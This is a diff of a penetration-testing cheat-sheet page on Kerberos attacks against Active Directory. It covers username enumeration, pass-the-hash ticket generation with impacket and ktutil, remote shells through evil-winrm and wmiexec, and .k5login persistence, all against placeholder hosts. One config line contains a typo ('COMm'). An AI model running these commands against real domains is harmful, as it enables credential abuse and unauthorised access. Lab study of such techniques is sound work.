@@ -58,41 +58,70 @@
 
 <div class="content"><hr>
 <h3 id="kerbrute">Kerbrute</h3>
-<p><a href="https://github.com/ropnop/kerbrute">Download kerbrute</a></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kerbrute userenum --domain example.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.11.10
+<p><a href="https://github.com/ropnop/kerbrute">kerbrute</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kerbrute userenum --domain example.com --dc 10.10.11.10 usernames.txt
+</span></span></code></pre></div><h4 id="usernames-generator">Usernames generator</h4>
+<p><a href="https://github.com/urbanadventurer/username-anarchy">username-anarchy</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./username-anarchy -i users.txt <span class="p">|</span> tee usernames.txt
 </span></span></code></pre></div><br>
 <hr>
 <h3 id="generate-kerberos-ticket-from-linux">Generate Kerberos Ticket (From Linux)</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt install krb5-user cifs-utils
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Step 1: Add domain controller to `/etc/hosts`</span>
-</span></span><span class="line"><span class="cl">10.10.11.10 example.com dc01.example.com dc01
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Step 2: Add domain controller as a DNS server to `/etc/resolv.conf`</span>
+<h4 id="method-1--using-impacket">Method #1 : Using impacket</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ntpdate -s 10.10.11.10 <span class="o">&amp;&amp;</span> impacket-getTGT -hashes :&lt;HASH&gt; example.com/administrator
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check ticket</span>
+</span></span><span class="line"><span class="cl">klist
+</span></span></code></pre></div><h4 id="method-2--using-kinit">Method #2 : Using kinit</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Step 0: Installation</span>
+</span></span><span class="line"><span class="cl">sudo apt install krb5-user cifs-utils
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Step 1: Add domain controller to &#39;/etc/hosts&#39; (Try different order if not work)</span>
+</span></span><span class="line"><span class="cl">10.10.11.10 dc01.example.com example.com dc01
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Step 2: Add domain controller as a DNS server to &#39;/etc/resolv.conf&#39;</span>
 </span></span><span class="line"><span class="cl">nameserver 10.10.11.10
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Step 3: Edit `/etc/krb5.conf`</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Step 3: Edit &#39;/etc/krb5.conf&#39;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">[</span>libdefaults<span class="o">]</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">default_realm</span> <span class="o">=</span> EXAMPLE.COM
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">[</span>realms<span class="o">]</span>
-</span></span><span class="line"><span class="cl">    example.com <span class="o">=</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nv">kdc</span> <span class="o">=</span> dc01.example.com:88
-</span></span><span class="line"><span class="cl">        <span class="nv">admin_serve</span> <span class="o">=</span> dc01.example.com
-</span></span><span class="line"><span class="cl">        <span class="nv">default_domain</span> <span class="o">=</span> example.com
+</span></span><span class="line"><span class="cl">    EXAMPLE.COM <span class="o">=</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">kdc</span> <span class="o">=</span> DC01.EXAMPLE.COMm:88
+</span></span><span class="line"><span class="cl">        <span class="nv">admin_server</span> <span class="o">=</span> dc01.EXAMPLE.COM
+</span></span><span class="line"><span class="cl">        <span class="nv">default_domain</span> <span class="o">=</span> EXAMPLE.COM
 </span></span><span class="line"><span class="cl">    <span class="o">}</span>
 </span></span><span class="line"><span class="cl">    
 </span></span><span class="line"><span class="cl"><span class="o">[</span>domain_realm<span class="o">]</span>
-</span></span><span class="line"><span class="cl">    .domain.internal <span class="o">=</span> example.com
-</span></span><span class="line"><span class="cl">    domain.internal <span class="o">=</span> example.com
+</span></span><span class="line"><span class="cl">    .domain.internal <span class="o">=</span> EXAMPLE.COM
+</span></span><span class="line"><span class="cl">    domain.internal <span class="o">=</span> EXAMPLE.COM
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Step 4: Sync time to domain controller</span>
-</span></span><span class="line"><span class="cl">ntpdate -s example.com
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Generate kerberos ticket for user: user</span>
+</span></span><span class="line"><span class="cl">sudo ntpdate -s example.com
+</span></span></code></pre></div><h4 id="2a-without-creds">2a. Without Creds</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Generate kerberos ticket for user: user</span>
 </span></span><span class="line"><span class="cl">kinit user
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check ticket</span>
-</span></span><span class="line"><span class="cl">klist
+</span></span></code></pre></div><h4 id="2b-with-hash">2b. With Hash</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ktutil
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">add_entry -p administrator@EXAMPLE.COM -k <span class="m">1</span> -key -e rc4-hmac
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;HASH&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">write_kt administrator.keytab
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">exit</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kinit -V -k -t administrator.keytab -f administrator@EXAMPLE.COM
+</span></span></code></pre></div><h4 id="check-ticket">Check ticket</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">klist
+</span></span></code></pre></div><br>
+<hr>
+<h3 id="remote-to-target-with-kerberos">Remote to target with kerberos</h3>
+<h4 id="method-1--using-evil-winrm">Method #1 : Using evil-winrm</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ntpdate -s 10.10.11.10 <span class="o">&amp;&amp;</span> evil-winrm -i dc.example.com -r EXAMPLE.COM
+</span></span></code></pre></div><h4 id="method-2--using-wmiexec">Method #2 : Using wmiexec</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ntpdate -s 10.10.11.10 <span class="o">&amp;&amp;</span> impacket-wmiexec example.com/administrator@dc.example.com -k -no-pass
 </span></span></code></pre></div><br>
 <hr>
 <h3 id="connect-to-smb-with-kerberos">Connect to SMB with kerberos</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">smbclient -W example.com //DC01/SYSVOL -k
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ntpdate -s 10.10.11.10 <span class="o">&amp;&amp;</span> impacket-smbclient example.com/username@dc.example.com -k -no-pass
+</span></span></code></pre></div><br>
+<hr>
+<h3 id="add-kerboros-access-linux">Add Kerboros Access (Linux)</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;user@EXAMPLE.COM&#34;</span> &gt; /home/target_user/.k5login
 </span></span></code></pre></div><br>
 <hr>
 <h3 id="ms14-068-forged-golden-ticket">MS14-068 (Forged Golden Ticket)</h3>
